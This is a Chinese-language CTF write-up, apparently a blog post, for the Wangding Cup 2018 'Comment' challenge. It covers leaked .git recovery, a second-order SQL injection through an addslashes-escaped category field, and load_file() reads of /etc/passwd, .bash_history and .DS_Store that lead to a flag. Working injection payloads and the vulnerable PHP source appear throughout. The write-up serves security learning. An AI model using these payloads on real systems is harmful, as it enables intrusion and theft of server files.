# [网鼎杯 2018]Comment git泄露 / 恢复 二次注入 .DS_Store bash_history文件查看

首先我们看到账号密码有提示了

我们bp爆破一下

我首先对数字爆破 因为全字符的话太多了



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc60d8604c3e16c4b8ed7c8353c87658.png" alt="" style="max-height:172px; box-sizing:content-box;" />


爆出来了哦

所以账号密码也出来了

```cobol
zhangwei
zhangwei666
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fd09711f503a17e6a622b2b983d6324d.png" alt="" style="max-height:152px; box-sizing:content-box;" />


没有什么用啊

扫一下吧



<img src="https://i-blog.csdnimg.cn/blog_migrate/fe7cf69506685afdc12fc31ee13e57bf.png" alt="" style="max-height:71px; box-sizing:content-box;" />


有git

## git泄露

那泄露看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/532019a76560a2a858c7dcc0bbe09d56.png" alt="" style="max-height:99px; box-sizing:content-box;" />


真有

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

原本的githack坏了

 [mirrors / BugScanTeam / GitHack · GitCode](https://gitcode.net/mirrors/BugScanTeam/GitHack?utm_source=csdn_github_accelerator) 

重新下了一个 需要下载后 里面存在 .git文件夹

然后看上面的代码 根本没有看懂 感觉不是全部

## git 恢复

所以我们可以使用git log --all看看

以前的情况



<img src="https://i-blog.csdnimg.cn/blog_migrate/c30cc5b6012fcc75e0d9b11119b6d018.png" alt="" style="max-height:385px; box-sizing:content-box;" />


我们直接回到最开始

```cobol
git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
```

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

全部代码就出来了

用了个switch 内容为go

```undefined
addslashes  这里是 通过转义的方式 存入数据库 很容易造成二次注入
 
因为会把内容原封不动传入数据库 
 
如果读取 就会造成二次注入
```

```php
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
 
这里我们能发现 查询的内容 是 category
 
 
所以category 就是我们写入的内容的参数了
```

这里懂得差不多了

```php
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
主要是这里 设定了从数据库提取出来的值
 
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
 
 
这里我们就可以构造了
 
$category=0' content = database(),/*    后面的/*是用来和我们详情里面输入的content闭合
 

```

我们首先写入留言

```vbnet
0',content=database(),/*
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/12ff088ed1e310a4713cc6f046ca4354.png" alt="" style="max-height:270px; box-sizing:content-box;" />


然后进去提交留言



<img src="https://i-blog.csdnimg.cn/blog_migrate/f1607f1d3b6ce5ec5c1d1fee14010d17.png" alt="" style="max-height:298px; box-sizing:content-box;" />




这个时候就会形成

```bash
   $sql = "insert into comment
            set category = '0',content = database(),/*',
                content = '*/#',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
 
 
更直观点
 
 
   $sql = "insert into comment
            set category = '0',content = database(),/*',content = '*/#',
                bo_id = '$bo_id'";
 
 
 
/*',content = '*/#'
 
 
这里就为空了 所以现在的语句是
 
set category = '0',content = database(),
                bo_id = '$bo_id'";
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/36f21742b19c130486861e869791765f.png" alt="" style="max-height:586px; box-sizing:content-box;" />


然后我们进行查表 发现没有flag

于是我们可以看看user()函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/0f16f3db33324cf3c64f458fcbe0d3a3.png" alt="" style="max-height:117px; box-sizing:content-box;" />


发现是root权限

那么多半就是 读取了

load_file可以读取

我们读取看看

这里又是另一个文件读取的方法了

之前做的题 proc这里没有用

## 任意文件读取

### .bash_history

我们首先去查看 etc/passwd

```cobol
0',content=(select load_file('/etc/passwd')),/*
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/753d4377417ad66e384a4335cc99076c.png" alt="" style="max-height:493px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/ef5940301ab92e63f20e32d5c226f4b0.png" alt="" style="max-height:89px; box-sizing:content-box;" />


发现存在 www用户 我们去看看他的历史命令

```cs
0',content=(select load_file('/home/www/.bash_history')),/*
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/efcc77bf4a62acde607ecea049e8414c.png" alt="" style="max-height:96px; box-sizing:content-box;" />


这里发现了 是删除了 .DS_Store

但是ctf环境一般都是docker环境 所以在

/tmp/html下还会存在

我们去读取

```cobol
0',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*


这里需要通过十六进制输出 因为会有很多不可见的字符
```

## .DS_Store泄露

我们通过通过瑞士军刀可以 恢复成 文件形式 并且导出

然后通过Python-dsstore-master

来实现解析读取文件

```cs
py3 .\main.py .\samples\download.dat
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/212d3427f7768f8839b4c8382e3bede7.png" alt="" style="max-height:253px; box-sizing:content-box;" />


我们来解析读取这个flag

```cs
0',content=(select load_file('/tmp/html/flag_8946e1ff1ee3e40f.php')),/*
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8ca68da059a6d265eceb7969c7acc060.png" alt="" style="max-height:207px; box-sizing:content-box;" />


但是这个文件是错误的 flag为错误

可能修改了 所以我们回去 /var进行读取

```cs
0',content=(select load_file('/var/www/html/flag_8946e1ff1ee3e40f.php')),/*
```

```cs
flag{5737c889-1e5b-47a6-b14d-87df5dd59e01}
```

知识点 过多了。。。。。

虽然都很基础 但是有的时候 真没想到 可以以后再做一次